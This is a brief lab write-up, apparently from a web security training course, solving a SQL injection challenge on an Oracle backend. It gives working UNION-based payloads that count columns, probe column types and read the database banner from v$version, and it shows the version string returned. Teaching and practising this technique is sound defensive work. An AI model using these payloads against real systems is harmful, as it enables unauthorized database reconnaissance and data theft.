
Lab: SQL injection attack, querying the database type and version on Oracle

---

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

1/ Determine the number of columns

```sql
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL, NULL FROM dual--
```


2/ Determine the data type of columns

```sql
' UNION SELECT 'AAA', 'AAA' FROM dual--
```


3/ Determine the type and version of the database

```sql
' UNION SELECT NULL, banner FROM v$version--
```

```text
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```

